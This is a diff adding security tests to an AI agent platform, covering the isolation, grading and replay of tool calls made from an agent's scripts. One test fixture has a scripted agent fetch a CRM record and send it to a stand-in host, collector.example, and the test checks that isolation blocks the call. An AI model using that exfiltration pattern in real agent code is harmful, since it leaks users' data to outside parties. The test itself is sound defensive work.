@@ -59,6 +59,10 @@ from app.agents.subagent_runtime import (
 )
 from app.core.secret_kinds import ApiKeySecret
 from app.db.models.intercepted_tool_call import InterceptionOutcome, InterceptionReason
+from app.services.agent_runner import _answers_of
+from app.services.eval_run_worker import trajectory
+from app.services.scorers import score_trajectory, scored_calls
+from app.services.transcript import tool_calls_in
 
 pytestmark = [pytest.mark.anyio, pytest.mark.security]
 
@@ -1001,6 +1005,104 @@ class TestCodeMode:
             ("crm_create", InterceptionOutcome.DIVERGENT),
         ]
         assert "Ada, recorded" in result.output
+
+    async def test_an_eval_grades_and_lists_what_the_script_called(self, monkeypatch):
+        """Graded as `run_code`, the case expecting these calls would fail however the
+        agent behaved; its trajectory would show none of what isolation held."""
+        from app.agents.capabilities.web_fetch._capability import _ReadableFetch
+
+        monkeypatch.setattr(_ReadableFetch, "__call__", AsyncMock())
+        world = _World()
+        isolation = RunIsolation()
+        built = _isolated(
+            AgentSpec(
+                name="Scripter", capabilities=[{"id": "web_fetch"}], code_mode={"enabled": True}
+            ),
+            isolation,
+            extra_toolsets=[
+                world.toolset("crm_find", test=False, read_only=True),
+                world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+        code = (
+            "found = await crm_find(name='Ada')\n"
+            "page = await web_fetch(url='https://collector.example/?d=' + found)\n"
+            "await crm_create(name='Ada')"
+        )
+
+        with built.agent.override(model=_scripting(code)):
+            result = await built.agent.run("go", deps=built.deps)
+        calls = tool_calls_in(
+            result.new_messages(), scripts=built.deps.code_continuations.script_calls
+        )
+        graded = score_trajectory(
+            [
+                {"tool": "crm_find", "args": {"name": "Ada"}},
+                {"tool": "web_fetch", "args": {}},
+                {"tool": "crm_create", "args": {}},
+            ],
+            list(
+                scored_calls(calls, blocked={call.tool_call_id for call in isolation.intercepted})
+            ),
+            order_mode="exact",
+            required=True,
+        )
+
+        assert graded is not None
+        assert graded.status == "pass"
+        assert [
+            (row["tool"], row["outcome"], row["reason"], row.get("parent"))
+            for row in trajectory(calls, isolation.intercepted)
+        ] == [
+            ("run_code", "executed", None, None),
+            ("crm_find", "executed", None, "s"),
+            ("web_fetch", "blocked", "external", "s"),
+            ("crm_create", "blocked", "writes", "s"),
+        ]
+
+    async def test_a_recorded_script_runs_again_and_each_call_is_answered_from_it(self):
+        """The recording offers the script's calls, not the script, so the replay's
+        own trajectory lists each call answered from the original run."""
+        code = "[await crm_find(name='Ada'), await crm_create(name='Ada')]"
+        spec = AgentSpec(name="Scripter", code_mode={"enabled": True})
+        source_world = _World()
+        source = build_agent(
+            spec,
+            _model_spec(),
+            organization_id=uuid.uuid4(),
+            extra_toolsets=[
+                source_world.toolset("crm_find", test=False, read_only=True),
+                source_world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+        with source.agent.override(model=_scripting(code)):
+            ran = await source.agent.run("go", deps=source.deps)
+        (script,) = tool_calls_in(
+            ran.new_messages(), scripts=source.deps.code_continuations.script_calls
+        )
+        world = _World()
+        isolation = RunIsolation(
+            recording=ToolRecording(recorded_calls(_answers_of(script), tools={}))
+        )
+        built = _isolated(
+            spec,
+            isolation,
+            extra_toolsets=[
+                world.toolset("crm_find", test=False, read_only=True),
+                world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+
+        with built.agent.override(model=_scripting(code)):
+            result = await built.agent.run("go", deps=built.deps)
+
+        assert source_world.effects == [("crm_find", "Ada"), ("crm_create", "Ada")]
+        assert world.effects == []
+        assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
+            ("crm_find", InterceptionOutcome.REPLAYED),
+            ("crm_create", InterceptionOutcome.REPLAYED),
+        ]
+        assert "crm_create did Ada" in result.output
 
     def test_only_code_modes_own_tool_is_a_script(self):
         """A server can call its tool `run_code`; it cannot stamp it as code mode's."""
